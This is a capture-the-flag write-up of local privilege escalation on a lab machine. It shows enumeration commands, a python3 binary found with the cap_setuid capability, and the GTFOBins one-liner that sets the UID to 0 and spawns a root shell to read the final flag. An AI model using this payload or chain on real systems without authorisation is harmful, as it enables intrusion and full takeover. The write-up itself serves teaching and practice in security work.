# Privilege Escalation to Root — Report

**Scope:** leverage access as `user3` to perform local privilege escalation and obtain the final flag as `root`.

---

## 1. Privilege Escalation Enumeration (as `user3`)

Manual enumeration was performed to find a path to the root account.

**Checking sudo privileges**

```bash
sudo -l
# Result: Sorry, user user3 may not run sudo on ip-10-1-222-144. (No sudo access)
```

**Checking user groups**

```bash
id
# Result: uid=1003(user3) gid=1003(user3) groups=1003(user3) (No interesting groups)
```

**Checking capabilities (the exploit vector)**  
Linux capabilities allow a subset of root privileges to be assigned to specific files or processes. This is a common privilege escalation vector in CTFs. The `getcap` command was used to search the entire filesystem for binaries with set capabilities.

```bash
getcap -r / 2>/dev/null
```

**Finding:** The search revealed a misconfigured capability on the `python3` binary in the user's home directory:

```
/home/user3/python3 cap_setuid=ep
```

- **Vulnerability:** The `cap_setuid` (Capability Set User ID) capability, when set on a binary, allows that program to change its effective user ID to any user, including root (UID 0), regardless of who executes it.
    

---

## 2. Exploiting Capabilities via GTFOBins

The vulnerability was confirmed by referencing GTFOBins, a resource that lists common misconfigurations and how to exploit them.

**Source:** GTFOBins — Python capabilities  
**Exploit method:** GTFOBins provides a payload to abuse `cap_setuid` by having the Python interpreter change its effective UID to 0 (root) and then execute a shell (`/bin/sh`).

Exploit payload:

```python
import os; os.setuid(0); os.system("/bin/sh")
```

---

## 3. Becoming Root

The exploit payload was executed using the misconfigured `python3` binary.

**Execute the payload**

```bash
user3@ip-10-1-222-144:~$ /home/user3/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

**Confirmation:** The prompt changed, and `whoami` confirmed root access.

```bash
# whoami
root
```

---

## 4. Final Flag Retrieval

With root access, the final flag was accessible.

**Retrieve Flag 6**

```bash
# cat /opt/root/flag6
```

**Success:** The machine is fully compromised, and the final flag is retrieved.

---

## Conclusion

The **Ascension** machine was fully compromised by chaining several issues discovered during enumeration, which culminated in local privilege escalation via a misconfigured Linux file capability (`cap_setuid`) on a Python binary. Other weaknesses in the environment that contributed to the full compromise included NFS export misconfigurations, a writable cron job, and cleartext database credentials.
